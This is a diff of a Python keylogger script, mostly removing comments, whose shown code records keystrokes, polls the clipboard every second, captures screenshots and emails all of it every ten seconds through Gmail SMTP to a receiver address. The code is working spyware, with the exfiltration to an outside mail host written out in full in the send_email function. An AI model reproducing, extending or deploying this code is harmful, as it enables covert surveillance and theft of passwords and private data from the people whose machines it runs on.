@@ -9,56 +9,53 @@ from email.mime.image import MIMEImage
 from io import BytesIO
 import time
 
-# variables to store keystrokes and clipboard 
 text = ""
 shift_pressed = False
 clipboard_content = ""
 
-# Gmail account credentials
 sender_email = "your@gmail.com"
 sender_password = "app Password"  # Consider using an App Password if needed
 receiver_email = "receiver@gmail.com"
 
-# Time interval in seconds to send an email
 time_interval = 10
 
 def send_email():
-    global text, clipboard_content  # Declare text and clipboard_content as global to modify them
+    global text, clipboard_content  
     try:
-        # Set up the MIME
+        
         message = MIMEMultipart()
         message['From'] = sender_email
         message['To'] = receiver_email
         message['Subject'] = 'Keystroke Data'
         
-        # Combine keystrokes and clipboard content
+        
         email_body = f"Keystrokes:\n{text}\n\nClipboard Content:\n{clipboard_content}"
         message.attach(MIMEText(email_body, 'plain'))
         
-        # Take a screenshot
+        
         screenshot = pyautogui.screenshot()
         screenshot_io = BytesIO()
         screenshot.save(screenshot_io, format='PNG')
         screenshot_io.seek(0)
         
-        # Attach the screenshot
+        
         image = MIMEImage(screenshot_io.read(), name='screenshot.png')
         message.attach(image)
         
-        # Create an SMTP session
-        server = smtplib.SMTP('smtp.gmail.com', 587)
-        server.starttls()  # Secure the connection
-        server.login(sender_email, sender_password)  # Login
         
-        # Send the email
+        server = smtplib.SMTP('smtp.gmail.com', 587)
+        server.starttls()  
+        server.login(sender_email, sender_password) 
+        
+        
         server.send_message(message)
         server.quit()
         
-        # Clear the text and clipboard content after sending
+        
         text = ""
         clipboard_content = ""
         
-        # Reschedule email by using time interval
+        
         global email_timer
         email_timer = threading.Timer(time_interval, send_email)
         email_timer.start()
@@ -67,7 +64,7 @@ def send_email():
         print(f"Failed to send email: {e}")
 
 def on_press(key):
-    global text, shift_pressed  # Declare text and shift_pressed as global to modify them
+    global text, shift_pressed  
     if key == keyboard.Key.enter:
         text += "\n"
     elif key == keyboard.Key.tab:
@@ -81,7 +78,6 @@ def on_press(key):
     elif key == keyboard.Key.esc:
         return False
     else:
-        # Handle special characters when shift is pressed
         if shift_pressed:
             special_chars = {
                 '1': '!',
@@ -119,16 +115,14 @@ def monitor_clipboard():
     try:
         while True:
             clipboard_content = pyperclip.paste()
-            time.sleep(1)  # Check clipboard every second
+            time.sleep(1) 
     except Exception as e:
         print(f"Clipboard monitoring failed: {e}")
 
-# Start clipboard monitoring in a separate thread
 clipboard_thread = threading.Thread(target=monitor_clipboard)
 clipboard_thread.daemon = True
 clipboard_thread.start()
 
-# Start email sending function
 email_timer = threading.Timer(time_interval, send_email)
 email_timer.start()
 
